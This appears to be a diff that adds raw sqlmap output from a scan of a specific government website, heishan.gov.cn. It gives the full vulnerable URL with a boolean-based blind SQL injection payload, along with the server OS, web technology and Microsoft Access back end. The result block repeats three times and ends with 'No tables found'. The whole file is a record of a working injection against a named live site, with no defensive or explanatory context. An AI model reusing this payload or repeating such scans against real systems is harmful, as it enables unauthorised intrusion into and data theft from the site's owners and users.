@@ -1,0 +1,34 @@
+sqlmap identified the following injection points with a total of 80 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://www.heishan.gov.cn:80/hsxwsp/index.asp?id=1717 AND 7016=7016
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP
+back-end DBMS: Microsoft Access
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://www.heishan.gov.cn:80/hsxwsp/index.asp?id=1717 AND 7016=7016
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP
+back-end DBMS: Microsoft Access
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://www.heishan.gov.cn:80/hsxwsp/index.asp?id=1717 AND 7016=7016
+---
+web server operating system: Windows
+web application technology: ASP.NET, ASP
+back-end DBMS: Microsoft Access
+No tables found
